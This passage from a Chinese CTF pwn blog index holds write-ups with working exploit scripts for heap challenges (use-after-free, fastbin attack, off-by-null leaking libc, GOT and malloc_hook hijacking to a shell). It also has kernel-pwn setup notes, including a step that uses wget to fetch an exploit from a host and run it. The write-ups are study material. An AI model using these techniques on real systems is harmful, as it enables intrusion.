rootfs.cpio\n\n4.启动qemu:\n\n(1)将rootfs.cpio、bzImage拖到一个文件夹下\n\n(2)制作启动文件：\n\n```\n//注释头\n\ntouch boot.sh\nvim boot.sh\n```\n\n(3)将下列代码拷入：\n\n```\n#注释头\n\n#! /bin/sh\nqemu-system-x86_64 \\\n-m 64M \\\n-kernel ./bzImage \\\n-initrd ./rootfs.cpio \\\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr\" \\\n-s \\\n-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\\n-nographic \\\n```\n\n图形化界面-nographic和console=ttyS0配合使用，启动界面就变成终端。\n\n最后./boot.sh即可启动qemu虚拟机。\n\n \n\n \n\n \n\n \n\n \n\n","tags":["kernel-Knowledge"],"categories":["pwn-kernel"]},{"title":"note-UAF","url":"/2021/08/14/note-UAF/","content":"\n1.源文件，忘记是哪里的题了。\n\n```\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nstruct note *notelist[10];\nint count = 0;\n\nstruct note{\n  void (*print_note)();\n  char *content;\n};\n\nvoid print_note_content(struct note *ptr_n) \n{ \n  puts(ptr_n -> content); \n}\n\nvoid add_note(){\n  int i;\n  char buf[8];\n  int size;\n  if (count > 10)\n  {\n    puts(\"Full\");\n    return;\n  }\n  for (i = 0; i < 10; i++){\n    if (!notelist[i])\n    {\n      notelist[i] = (struct note *)malloc(sizeof(struct note));\n      if (!notelist[i])\n      {\n        puts(\"Alloca Error\");\n        exit(-1);\n      }\n      notelist[i] -> print_note = print_note_content;\n      printf(\"Note size :\");\n      read(0, buf, 8);\n      size = atoi(buf);\n      notelist[i] -> content = (char *)malloc(size);\n      if (!notelist[i] -> content) \n      {\n        puts(\"Alloca Error\");\n        exit(-1);\n      }\n      printf(\"Content :\");\n      read(0, notelist[i] -> content, size);\n      puts(\"Success !\");\n      count++;\n      break;\n    }\n  }\n}\n\nvoid del_note() \n{\n  char buf[4];\n  int idx;\n  printf(\"Index :\");\n  read(0, buf, 4);\n  idx = atoi(buf);\n  if (idx < 0 || idx >= count) \n  {\n    puts(\"Out of bound!\");\n    _exit(0);\n  }\n  if (notelist[idx]) \n  {\n    free(notelist[idx]->content);\n    free(notelist[idx]);\n    puts(\"Success\");\n  }\n}\n\nvoid print_note() \n{\n  char buf[4];\n  int idx;\n  printf(\"Index :\");\n  read(0, buf, 4);\n  idx = atoi(buf);\n  if (idx < 0 || idx >= count) \n  {\n    puts(\"Out of bound!\");\n    _exit(0);\n  }\n  if (notelist[idx]) \n  {\n    notelist[idx] -> print_note(notelist[idx]);\n  }\n}\n\nvoid magic() \n{ \n  system(\"cat ./flag\"); \n}\n\nvoid menu() {\n  puts(\"----------------------\");\n  puts(\"       UAF NOTE       \");\n  puts(\"----------------------\");\n  puts(\" 1. Add note          \");\n  puts(\" 2. Delete note       \");\n  puts(\" 3. Print note        \");\n  puts(\" 4. Exit              \");\n  puts(\"----------------------\");\n  printf(\"Your choice :\");\n};\n\nint main() {\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(stdin, 0, 2, 0);\n  char buf[4];\n  while (1) {\n    menu();\n    read(0, buf, 4);\n    switch(atoi(buf)) \n    {\n      case 1:\n        add_note();\n        break;\n      case 2:\n        del_note();\n        break;\n      case 3:\n        print_note();\n        break;\n      case 4:\n        exit(0);\n        break;\n      default:\n        puts(\"Invalid choice\");\n        break;\n    }\n  }\n  return 0;\n}\n```\n\n编译一下：\n\n```\n#注释头\n\ngcc note.c -no-pie -o note\n```\n\n2.打开IDA，查漏洞，del-note函数中存在UAF漏洞，并且还有后门：\n\n```\n#注释头\n\nif ( notelist[idx] )\n{\n    free(notelist[idx]->content);\n    free(notelist[idx]);\n    puts(\"Success\");\n}\n//这里经过IDA人工数据修改过，刚打开不会是这样的。\n----------------------------------------------------\nint magic()\n{\n    return system(\"cat ./flag\");\n}\n```\n\n可以看到在Free之后没有将指针置空，导致Free之后，如果通过程序中的print选项来打印依然可以调用被该指针对应的函数，所以这里存在UAF。\n\n3.这一题中有一个结构体，定义如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191534858.jpeg)\n\n其中malloc顺序是：\n\n(1)malloc控制数据部分chunk_control，固定大小为0x10。\n\n(2)将content，也就是真正数据部分malloc出来，chunk_data，这里可以设置size。\n\nfree顺序是：\n\n(1)先free掉data部分，chunk_data。\n\n(2)再free控制数据部分的struct，chunk_control。\n\n4.思考攻击思路，既然有UAF漏洞，那么我们可以想办法Free几个chunk，然后利用fastbins先进后出的原则，将某个控制数据部分的chunk_control申请回来变成我们可以操作的chunk_data，进行fastbins attack。之后修改其中的打印函数地址，改为后门函数地址，那么使用程序中的print就可以跳转后门函数获取flag。\n\n5.先申请两个结构，data部分至少为0x19，使得chunk_data不落入到0x20的fastbins中。之后释放掉这两个结构，然后fastbins中的结构如下：\n\n```\n#注释头\n\nfastbinsY[0]:0x10:chunk_control1->chunk_control0\nfastbinsY[x]:0xxx:chunk_data1->chunk_data0\n```\n\n6.然后申请一个0x10大小的结构，编号A，该结构中的对应就变成这样：\n\n```\n#注释头\n\nchunk_controlA=chunk_control1\nchunk_dataA=chunk_control0\n```\n\n7.现在可以修改chunk_dataA，将其内容改为后门函数地址，然后使用程序中的print，输入索引为0，然后就会运行chunk_control0中的打印函数，也就相当于运行chunk_dataA中的后门函数。\n\n简单exp如下：\n\n```\n#注释头\n\nadd(0x20,'aaaaaaaa') #chunk_control0+chunk_data0\nadd(0x20,'AAAAAAAA') #chunk_control1+chunk_data1\n#这里的0x20可以随便改，只要大于等于0x19即可，两个0x20也可以不一样。\n\nfree(0)\nfree(1)\n#free顺序:chunk_data0,chunk_control0,chunk_data1,chunk_control1\n\nbackdoor = p64(elf.sym['magic'])\nadd(0x10,backdoor)\n#malloc顺序:chunk_controlA=chunk_control1,chunk_dataA=chunk_control0\n\nshow(0)\nprint(p.recv())\n#获取flag\n```\n","tags":["UAF"],"categories":["PWN","pwn堆-UAF"]},{"title":"pesp-heap_overflow-struct","url":"/2021/08/14/pesp-heap_overflow-struct/","content":"\n1.第三种方法，通过堆溢出直接改struct，然后更改结构体chunklist[0].chunk中保存的chunk地址，使其指向free_got_addr，再通过程序中的show函数就可以泄露出free_got_addr中保存的free真实地址，从而获得libc的基地址。当然，这得要求先有一个free来让free的延迟绑定发生。\n\n2.由于这里的chunk地址已经变成free_got_addr，所以当我们修改该chunk的内容时，就相当于修改got表中值，也就修改了真实函数地址的值。这里就可以通过修改该chunk内容来劫持free的got表为system函数真实地址，从而free一个内容为binsh的chunk来getshell。\n\n3.编写exp，增删改查函数就不多说了。\n\n(1)申请三个chunk，先将chunk1释放，之后chunk0用来堆溢出，修改chunk1的fd，进行fastbins攻击，将fakechunk放在struct前面某个位置。这里用到字节错位，原理一样，利用0x7f来攻击fastbins。再连续申请两个chunk，chunk1和chunk3就回来，这里的chunk3就是fakechunk了。现在就可以修改fakechunk从而修改掉chunklist[0].chunk的值，使其指向free_got_addr。从而调用show函数泄露free的真实地址。\n\n```\n#注释头\n\nadd(0x60,\"\\x00\"*0x60) #chunk0\nadd(0x60,\"\\x11\"*0x60) #chunk1\nadd(0x60,'/bin/sh\\x00') #chunk2 binsh\n\nremove(1)\nchange(0,0x100,flat(\"\\x00\"*0x60,p64(0),p64(0x71),p64(bss)))#chunk0_overflow\nadd(0x60,\"\\x11\"*0x60)#get chunk1\nadd(0x60,flat(\"\\x00\"*0x3,p64(0x100),p64(free_got_addr)))#get fakechunk\nshow()\nio.recvuntil(\"0 : \")\nlibc_base = u64(io.recv(6).ljust(8,'\\x00')) - libc.sym['free']\n```\n\n(2)再修改chunk0的内容为system真实地址，这样就相当于劫持free的got表，之后释放掉chunk2即可getshell。\n\n```\n#注释头\n\nsystem_libc = libc_base + libc.sym['system']\nputs = libc_base + libc.sym['puts']\nchange(0,0x100,flat(p64(system_libc,),p64(puts)))\nremove(2)\nio.interactive()\n```\n\n▲需要注意的一点就是，由于read函数读取，所以我们发送数据时一定会有一个\\x0a加入进去，这里如果不考虑进入，free函数后面就是put函数，那么就会造成put函数的Got表被更改，从而无法成功调用put函数。而程序在循环体中的菜单部分又一定会调用put函数，那么这样就会造成程序崩溃。所以需要将put函数也加入进去，但是这样又会造成put函数下一个函数被覆盖\\x0a。不过不要紧，gdb调试可以看到put函数下一个函数是stack_chk_fail函数，也就是检查canary出错时才会调用。我们有没有栈溢出修改canary，这个函数当然不会被调用，程序就不会崩溃。\n\n \n\n \n\n \n","tags":["Heap-Skill"],"categories":["PWN","pwn堆-刷题技巧"]},{"title":"pesp_off-by-null","url":"/2021/08/14/pesp_off-by-null/","content":"\n1.还是之前的2018网鼎杯的pesp题目。这里假设没有堆溢出，有PIE保护，无法劫持got表。只使用0字节溢出漏洞来获取libc地址，再根据得到的libc地址来更改malloc_hook和realloc_hook里面保存的地址为one_gadget，一步getshell。(realloc_hook为onegadget，malloc_hook为__libc_realloc函数中调整栈帧的地方)\n\n2.先梳理一下0字节溢出漏洞，一般的chunk改内容都是：\n\n```\n#注释头\n\nread(0, chunk_ptr, size);\n```\n\n这样就只能输入size这么大的内容，但是这道题中，在add函数中和change函数中：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536207.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536488.jpeg)\n\n可以看到给chunk添加内容的语句都是：\n\n```\n#注释头\n\n*(itemlist[i].cont + read(0, itemlist[i].cont, len)) = 0;// off by null\n```\n\n这样当我们将chunk内容顶满之后，程序会将chunk指针最后部分再溢出一个字节赋值为0，这就是off-by-null。\n\n由于scanf函数会在末尾自动补\\x00，这其实也是一种off-by-null，\n\n```\n#注释头\n\nchar buf[10];\nscanf(\"10%s\",buf);\n```\n\n \n\n▲free源码：\n\n```\n#注释头\n\nif (!prev_inuse(p)) {\n    prevsize = p->prev_size;\n    size += prevsize;\n    p = chunk_at_offset(p, -((long ) prevsize));\n    unlink(av, p, bck, fwd);\n}\n```\n\n也就是如果当前chunk的IN_USE位为0，那么就根据当前chunk的pre_size位，找到前一个chunk_pre，将chunk_pre的size位改成size+pre_size，通过Unlink取出chunk_pre，准备合并。(之后的检查代码会再循环，也就是再看chunk_pre的IN_USE位是不是0来判断要不要再向上合并，这里不重要)\n\n所以如果我们通过off-by-null，溢出0到chunk_next的size位中的IN_USE位，那么当前chunk就会被标记为Free，这样在Free(chunk_next)时，就会将chunk和chunk_next合并。如果我们又更改了chunk_next的pre_size位，使它变得更大，那么就可以向上合并更大的chunk块。这就是off-by-null的利用方法，这题中如下：\n\n(需要注意的是，由于溢出的是一个字节而不是一个Bit，所以size一般都设置为0xf0，从而使size位变成0x101，溢出之后进而变成0x100。但如果size最开始设置为0x20，size位就是0x30，溢出0字节就会变成0x00，那样程序照样崩溃。)\n\n(1)先申请四个chunk，分别为chunk0,chunk1,chunk2,chunk3。(chunk3防止合并用)\n\n(2)然后free掉chunk0，(这里chunk0需要足够大，一般得大于0x80，也就是MAX_fastbins)，使其进入unsortedbins中。(这里必须free掉chunk0，不然之后修改掉chunk2的pre_size位时，然后free掉chunk2时，程序依据pre_size来判断是否合并时，发现chunk0仍旧处于使用当中，但pre_size包含了chunk0，就会造成程序崩溃)\n\n(3)修改chunk1的最后八个字节，也就是chunk2的pre_size位，使得chunk2的pre_size位的大小为chunk0_size+chunk1_size。\n\n(4)free掉chunk2，使得chunk0,chunk1,chunk2三个chunk作为一个整体被合并之后放入到unsortedbins中，调试过程可以发现，chunk0的size位被修改成了sizeof(chunk0+chunk1+chunk2)。但是这里实际情况中，chunk1并没有被释放，只是它的内存处在被释放的内存中间，依然可以通过chunk1的指针来操作。也就是在这个程序中依旧可以进行edit来修改chunk1，或者show来打印chunk1。\n\n(5)再次申请chunk0大小，这样就会割裂unsortedbins中的remainder为chunk0+new_remainder，把chunk0申请回来，剩下的new_remainder依旧放在unsortedbins中。在unsortedbins中的remainder有个特点，就是该chunk的fd和bk一定指向unsortedbins链表头部，(如果有多个remainder，那么顺序类似于smallbins，依旧可以使用第一个chunk的bk来获取unsortedbins链表头部)\n\n(6)那么现在unsortedbins中有chunk1和chunk2，而chunk1的fd和bk都指向unsortedbins链表头部，并且在程序中chunk1仍旧处于使用状态，fd和bk就是chunk1的data部分。所以show函数就可以打印出chunk1的data部分，从而打印出fd和bk指向的unsortedbins头部链表地址。又由于unsortedbins处在main_arena+0x58位置，而main_arena相对于libc基地址的偏移是固定的，为0x3c4b20(不同glibc版本可能不同，这是libc2.23的)，所以这也就间接泄露出了libc基地址。\n\n▲查询main_arena方法：\n\n①工具查询：https://github.com/coldwave96/libcoffset：\n\n②IDA查询：main_arena存储在libc.so.6文件的.data段，使用IDA打开libc文件，然后搜索函数malloc_trim()\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191537434.jpeg)\n\n \n\n3.现在有了libc基地址，那么接下来就考虑修改mallo_hook和realloc_hook的值。同样使用0字节溢出漏洞，伪造fakechunk为mallo_hook地址，修改fakechunk从而修改malloc_hook和realloc_hook。这里先忽略上面的，程序中的索引会不太一样。攻击思路如下：\n\n(1)先申请一个较大的chunk，防止和上面的合并\n\n(2)之后的操作方法类似，先申请四个chunk，分别为chunk0,chunk1,chunk2,chunk3。(chunk3防止合并用)\n\n(3)free掉chunk0，使其进入unsortedbins中。修改chunk1的最后八个字节，也就是chunk2的pre_size位，使得chunk2的pre_size位的大小为chunk0_size+chunk1_size。\n\n(4)free掉chunk2，使得chunk0,chunk1,chunk2三个chunk作为一个整体被合并之后放入到unsortedbins中。再free掉chunk1，使其进入fastbins中。这样chunk1即在fastbins中，也处在unsortedbins中。\n\n(5)申请一个特殊大小的chunk块，最小为chunk0_size+0x20，使其的data部分足够大，能够修改掉chunk1的fd位，将chunk1的fd位指向fakechunk，由于需要从size位覆盖到fd，所以需要伪造合法的size，为chunk1_size。\n\n(6)申请两个chunk1大小的chunk_a，chunk_b，这样第一次申请的chunk_a就是从fastbins中回来的chunk1。而chunk_b就是chunk1的fd指向的fakechunk。这样如果将fakechunk放在realloc_hook之前，那么就可以修改掉realloc_hook和malloc_hook，使得realloc_hook指向one_gadget，而malloc_hook指向__libc_libc函数中的某个可以控制栈帧的地址，从而满足gadget条件来getshell。\n\n4.开始编写exp，增删改查函数就不说了:\n\n(1)获取libc基地址：\n\n```\n#注释头\n\nadd(0xf0,'0'*0xf0)\nadd(0x68,'1'*0x68)#trigger 0ff-by-null\nadd(0xf0,'2'*0xf0)\nadd(0x10,'3'*0x10)\n#chunk0,chunk1,chunk2,chunk3(防止合并)\n\ndelete(0)#防止程序崩溃\nedit(1,0x68,flat('1'*0x60,0x170))\n#修改chunk2的pre_size，使得chunk0,chunk1,chunk3手牵手进入unsortedbins中\ndelete(2)\n#触发chunk2的pre_size作用\n\n#关键就在这个add，目的就是将unsortedbins的链表头部放到chunk1的fd和bk位\nadd(0xf0,'x'*0x10)\n\n#现在就可以打印chunk1来获取unsortedbins链表的头部地址，从而计算得到libc地址\nshow()\nlibc_address = u64(io.recvuntil(\"\\x7f\")[-6: ]+'\\0\\0')-0x3c4b78\nprint(\"libc @ {:#x}\".format(libc_address))\n```\n\n(2)伪造fakechunk：\n\n```\n#注释头\n\nadd(0x160,'4'*0x160)\n#第一个chunk防止合并加程序崩溃\n\nadd(0xf0,'a'*0xf0)\nadd(0x68,'b'*0x68)\nadd(0xf0,'c'*0xf0)\nadd(0x10,'d'*0x10)\n#四个chunk，套路一样。由于程序编写原因，所以索引变成chunk4,chunk5,chunk6,chunk7,对应上面的chunk0,chunk1,chunk2,chunk3。\n\n\ndelete(4)#防止程序崩溃\nedit(5,0x68,flat('b'*0x60,0x170))\n#修改chunk2的pre_size，使得chunk0,chunk1,chunk3手牵手进入unsortedbins中\ndelete(6)\n#触发chunk6的pre_size作用\n\ndelete(5)\nadd(0x120,flat('A'*0xf8,0x70,(libc_address+0x3c4aed)))\n#使得chunk5进入fastbins，之后修改其fd位，创造一个fakechunk进入fastbins。这里的fakechunk_addr就是libc_address+0x3c4aed。这里的0x70写成0x71也是一样的，因为之后是malloc，不会管chunk的IN_USE位，也就是P位。\n```\n\n(3)申请获得fakechunk，同时修改该fakechunk，劫持malloc_hook和realloc_hook。\n\n```\n#注释头\n\nadd(0x68,'x'*0x10)\nadd(0x68,flat('\\0'*11,(libc_address+one_gadget),(libc_address+16+libc.sym[\"__libc_realloc\"])))\n```\n\n(4)随便申请一个chunk即可getshell，但是这里不要使用之前我们定义的add函数，因为程序一旦call malloc即可getshell，即运行到输入长度即可，但是我们的add函数中一直运行到输入内容才结束，会导致程序卡住，所以应该是：\n\n```\n#注释头\n\nio.sendlineafter(\"choice:\",\"2\")\nio.sendlineafter(\":\",\"anything\")\n\nio.interactive()\n```\n\n5.这里需要很多调试的步骤：\n\n(1)从最开始打算伪造fakechunk时就应该知道我们的chunk大小应该设置为0x68，因为程序跑起来是0x7f开头，拿来伪造size再合适不过，这样的chunk大小是0x70。而我们又只能用0字节溢出，所以需要将chunk设置到最大，也就是0x70-0x08。\n\n(2)而0xf0可以改变，只要比fastbins_MAX大就行，那么对应的0x170也需要改变，同时也要改变0x120。\n\n(3)申请fakechunk步骤中的'\\0'*11也是需要通过调试算出来，方法就是gdb查看realloc_hook-0xxx附近的内存，选择合适的可以伪造size的地址，之后通过填充padding来覆盖realloc_hook和malloc_hook。\n\n(4)onegadget相关的+16也得通过调试才能知道，这里选取的onegadget条件是[rsp+0x30]==Null。所以调试时将断点下在__libc_realloc函数上，进入__libc_realloc函数，从而一直进入到onegadget的执行代码中，如下：\n\n先下断点让程序运行到这![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536075.jpeg)\n\n再输入ni进入:![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191537426.jpeg)\n\n这时候就可以看rsp的值了：![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536542.jpeg)\n\n这里的rsp是0x7ffca3331eb8，rsp+0x30=0x7ffca3331ee8，对应图中的值就得是0才满足条件(这里已经计算过了，+16)\n\n▲如果从最开始进入__libc_realloc函数，进入到onegadget中之后，发现条件不满足，那么需要观察前后的值，从而决定从哪里进入__libc_realloc函数才能使得rsp满足。![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536192.jpeg)\n\n因为__libc_realloc(就是realloc)函数有一堆的push和sub操作，少一个push，那么rsp就可以下挪0x08，相当于rsp+0x08，中间还有sub rsp,xxh，相当于上挪rsp。所以决定从哪里进入realloc函数决定了onegadget的成功与否。![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536822.jpeg)\n\n而通过汇编代码可以看到，实际的onegaget是通过0x84724 mov rax,cs:__realloc_hook_ptr传进来，之后由于\n\n```\n#注释头\n\ntest rax rax\njnz  loc_84958\n```\n\nrax不为0，必定跳转loc_84958:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191538482.jpeg)\n\n这里才是我们选择调用进入onegadget的入口。所以之前在__libc_realloc的计算都是为了调整栈帧，不然其实如果栈帧不用调整就可以满足，那么我们可以直接将malloc_hook改成onegadget也可以直接getshell。因为__libc_malloc函数中的汇编代码也是类似的：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536213.jpeg)\n\n而且这还是一个无条件跳转。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536275.jpeg)\n\n可以看到有两个push,一个sub rsp,8;两个Pop。相当于只要在call malloc之前，我们的rsp+0x28==NULL即可满足onegadget的rsp+0x30==NULL的条件。当然，以上只是在Libc2.23下的，如果是其它版本的libc就可能不太一样。\n\n \n\n \n","tags":["off-by-null"],"categories":["PWN","pwn堆-off-by-null"]},{"title":"pwn-kernel_做题知识","url":"/2021/08/14/pwn-kernel_做题知识/","content":"\n\n\n一、题目给的文件：\n\n1.bzImage：就是linux编译后的运行内核，在启动参数中设置即可。\n\n2.file.cpio：题目给的，有的可以直接用qemu启动运行，但是有的需要解压后再打包，具体看题目。\n\n3.xx.sh文件:启动文件，里面包含代表qemu启动时的各种参数：\n\n(1)qemu-system-x86_64：架构\n\n(2)-m：设置运行内存。\n\n-m 64M\n\n-m 128M....\n\n(3)-kernel：设置运行的内核，一般题目会给，自己也可以去 [www.kernel.org](http://www.kernel.org) 来下载编译内核。\n\n-kernel bzImage\n\n(4)-initrd：设置初始化的根文件系统，就是.cpio文件，题目给的可能有陷阱什么的，一般我们需要解压然后看看其中的init是不是有些干扰东西。\n\n例如poweroff -d 120 -f & 这行代码就代表定时关机，这就需要去掉，去掉可能的干扰后就再打包，重新生成.cpio文件，然后通过./xx.sh启动\n\n①解压：\n\nmkdir file\n\ncd file\n\ncpio -idm < ./core.cpio  //再次解压\n\n```\n#注释头\n\nmv ../file.cpio file.cpio.gz  //改名，方便gunzip识别格式\ngunzip ./file.cpio.gz     //解压\n#如果是正常cpio打包则不需要，但是有的题目就会有用Gunzip压缩之后再cpio打包。\n```\n\n然后删除file.cpio文件，没啥用了，那么现在的目录下的文件如果再打包生成cpio文件就会是qemu加载之后的根目录文件系统了。\n\n-initrd ./core.cpio\n\n②打包：\n\n切换到根目录下：\n\nfind ./* | cpio -H newc -o > file.cpio\n\n当前目录下就生成file.cpio文件，拖到和start.sh、bzImage放到一个目录下，运行start.sh就可以启动qemu虚拟机了。\n\n(5)-append：附加的字符串，为grub引导内核时附加的命令行参数，指明控制台，特权，初始路径等，指定no kaslr可以关闭随机偏移。\n\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr\"\n\n(6)-s：添加gdb调试的相关条件，只用-s就行，等同于-gdb tcp::1234\n\n(7)-cpu 设置cpu安全选项。kvm64是加速器\n\n-cpu kvm64,+smep  (kvm64，开启smep保护)\n\n(8)--nographic：设置为无图形界面\n\n还有其它的各种选项参数，遇到题目再查吧，需要注意的是smep,smap,kaslr等相关的\n\n4.vmlinux：静态编译，未经过压缩的kernel文件，bzImage是压缩后的文件。\n\n \n\n二、根文件目录下的文件：\n\n1.init：启动系统的参数设置，很多，慢慢看，多了解。\n\n(1)insmod：加载驱动，一般就是file.ko文件，找到它来分析。\n\n(2)poweroff：关机，相关定时一般去掉\n\n(3)setsid：设置终端权限，id为0即为root，本地修改为0即为root权限\n\nsetsid /bin/cttyhack setuidgid 1000 /bin/sh\n\n2.file.ko文件：一般这个就相当于是常规pwn的binary文件，漏洞应该在这里面，可以用IDA打开来分析。\n\n3.vmlinux：题目没直接给的，一般cpio压缩包中都会有，可以用来查gadget。\n\ntime ropper --file ./vmlinux --nocolor > g1\n\ntime ROPgadget --binary ./vmlinux > g2\n\n没有的也可以提取出来：\n\n./extract-vmlinux ./bzImage > vmlinux\n\n(extract-vmlinux文件：https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux )\n\n4.其它的就没什么重要的了，然后有的题目会有gen_cpio.sh相关文件，用来生成cpio文件，这时候就直接使用，如果用find ./* | cpio -H newc -o > file.cpio可能并不太好使。\n\n \n\n \n\n三、gdb调试：\n\n1.start.sh中设置-s或者-gdb tcp::1234\n\n2.设置init中的setsid，设置为root权限\n\n3.加载符号表：\n\n(1)qemu内：\n\ncat /sys/module/core/sections/.text  //找到基地址\n\n0xffffffffc018b000\n\n(2)qemu外：\n\ngdb ./vmlinux -q\n\nadd-symbol-file ./file.ko 0xffffffffc018b000\n\n(现在就可以对函数下断点：b core_read，或者根据file.ko文件中的函数偏移加上基地址。)\n\n4.连接到qemu内部的文件：\n\nqemu外的gdb中输入：\n\ntarget remote localhost:1234\n\n之后就可以互动，通过编写exp启动来触发断点。\n\n \n\n \n\n四、提权：\n\n(1)本地：\n\n将编译后的exploit放到初始根目录文件系统中/tem中，再次打包生成cpio文件，运行qemu，之后运行exploit即可。\n\n(2)远程：\n\n本地写好 exploit 后，可以通过 base64 编码等方式把编译好的二进制文件保存到远程目录下，进而拿到 flag。同时可以使用 musl, uclibc 等方法减小 exploit 的体积方便传输。\n\n编译：gcc exploit.c -static -masm=intel -g -o exploit\n\n可以用python配上busybox来设置：\n\n①在本地有exploit的文件夹下运行：python2 -m SimpleHTTPServer\n\n记住本地ip，端口为8000\n\n②在远程中运行：wget -O ./exploit http://192.168.80.132:8000/exploit\n\n这样就可以通过网络来传输exploit\n\n(3)真实题目环境可能没有网络，这时候需要用到脚本：\n\n```\n#注释头\n\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom pwn import *\nimport os\n\n# context.log_level = 'debug'\ncmd = '# '\n\ndef exploit(r):\n    r.sendlineafter(cmd, 'stty -echo')\n    os.system('musl-gcc -static -O2 ./poc/exp.c -o ./poc/exp')\n    os.system('gzip -c ./poc/exp > ./poc/exp.gz')\n    r.sendlineafter(cmd, 'cat <<EOF > exp.gz.b64')\n    r.sendline((read('./poc/exp.gz')).encode('base64'))\n    r.sendline('EOF')\n    r.sendlineafter(cmd, 'base64 -d exp.gz.b64 > exp.gz')\n    r.sendlineafter(cmd, 'gunzip ./exp.gz')\n    r.sendlineafter(cmd, 'chmod +x ./exp')\n    r.sendlineafter(cmd, './exp')\n    r.interactive()\n\n\np = process('./boot.sh', shell=True)\n# p = remote('127.0.0.1',0000 )\n\nexploit(p)\n```\n\n这里需要在当前目录下新建一个 poc 文件夹，把 exp.c 文件放进去，或者自己修改下脚本也可以，另外还需要安装musl-gcc，在ubuntu下：apt-get install musl-tools\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191511955.jpeg)\n\n这是sixstars 战队中一位师傅的脚本，不知道是哪位大佬的。\n\n \n","tags":["Kernel-Knowledge"],"categories":["pwn-kernel"]},{"title":"pesp_heap-overflow","url":"/2021/08/14/pesp_heap-overflow/","content":"\n1.常规checksec，开了canary和NX，Partial RELRO。开IDA找漏洞，change函数中存在堆溢出:\n\n```\n#注释头\n\nint v0; // ST08_4\nchar nptr; // [rsp+20h] [rbp-10h]\nchar buf; // [rsp+10h] [rbp-20h]\n----------------------------------------------------------\nprintf(\"Please enter the index of servant:\");\nread(0, &buf, 8uLL);\nv2 = atoi(&buf);\n--------------------------------------------------------------\nprintf(\"Please enter the length of servant name:\", &buf);\nread(0, &nptr, 8uLL);\nv0 = atoi(&nptr);\n```\n\n可以发现change函数中，并没有检查堆块的大小，我们输入多少，它就认为是多少，所以这里可以制造堆溢出。\n\n2.这题有很多其它漏洞，这里先只利用堆溢出来思考下。\n\n(1)先申请两个chunk，chunk1和chunk2，然后修改chunk1的大小和内容，使得溢出数据，将chunk2的fd改成got表中地址，之后释放掉chunk2，使其在fastbins中的结构为:\n\n```\n#注释头\n\nfastbins->chunk2\nchunk2.fd=got_addr。\n```\n\n这样就可以再申请chunk_a，chunk_b，这里的chunk_a就是从fastbins中申请回来的chun2，而chunk_b的首地址就是got_addr。之后通过修改chunk_b的内容，这样就可以修改got表中的内容，从而劫持got表。\n\n(2)由于这里引入了printf函数，所以可以将free函数的got表劫持为printf(plt)函数，这样就可以在free一个chunk时制造格式化字符串漏洞，通过修改chunk内容为需要的格式化字符之后，再通过该格式化字符串漏洞泄露栈上某函数的Libc地址，从而计算得到libc基地址，从而计算得到system函数真实地址。\n\n(3)之后再通过上述方法，将free_got劫持为system_real_addr，之后释放一个内容为binsh字符串的chunk，就相当于调用system(\"/bin/sh\")，从而getshell。\n\n3.开始编写payload\n\n(1)首先确定增删改查函数：\n\n```\n#注释头\n\ndef show():\n    io.sendlineafter(\"choice:\",\"1\")\n\ndef add(length,cont):\n    io.sendlineafter(\"choice:\",\"2\")\n    io.sendlineafter(\":\",str(length))\n    io.sendafter(\":\",cont)\n    sleep(0.01)\n\ndef edit(idx,length,cont):\n    io.sendlineafter(\"choice:\",\"3\")\n    io.sendlineafter(\":\",str(idx))\n    io.sendlineafter(\":\",str(length))\n    io.sendafter(\":\",cont)\n    sleep(0.01)\n\ndef delete(idx):\n    io.sendlineafter(\"choice:\",\"4\")\n    io.sendlineafter(\":\",str(idx))\n```\n\n(2)尝试修改got表，制造格式化字符串溢出漏洞\n\n```\n#申请三个chunk，chunk0,chunk1,chunk2包括之后需要的格式化字符。\nadd(0x50,'000000')\nadd(0x50,'111111')\nadd(0x10,\".%17$p.\")\n#64位程序，将断点下在change函数中的call free，观察此时栈中数据，可以发现从rsp往下数12是libc_main_addr，计算偏移为12+6-1=17.\n\n#释放chunk1,之后修改chunk1的fd位使其指向fakechunk\ndelete(1)\nedit(0,0x100,flat('0'*0x50,'00000000',0x61,0x601ffa))\n#这里两条代码顺序不能改变，因为当chunk1被释放时，其fd位会发生改变，指向0x0，第一个进入fastbins的chunk其fd只要不被修改，一直都是指向0x0。所以需要先释放，再修改，防止之后fd被修改指向0x0。\n#现在fastbins为:fastbinsY[0]->chunk1->fakechunk\n\n#连续申请两个chunk，将chunk1和fakechunk申请回来，同时劫持got表，将free函数的got表值改成printf的plt表值，调用plt表中代码，从而调用printf函数。\nadd(0x50,'xxxxxxxx')\nadd(0x50,flat(\"\\0\"*0xe,flat(elf.sym[\"printf\"])[:6]))#get fakechunk,change got\n\n#释放chunk2，触发free函数，也就是劫持后的printf函数，得到栈上地址libc_main_addr，计算得到libc_address\ndelete(2)\nio.recvuntil(\".\")\ntemp = io.recvuntil(\".\",drop=True)\nlibc_address = int(temp,16) - 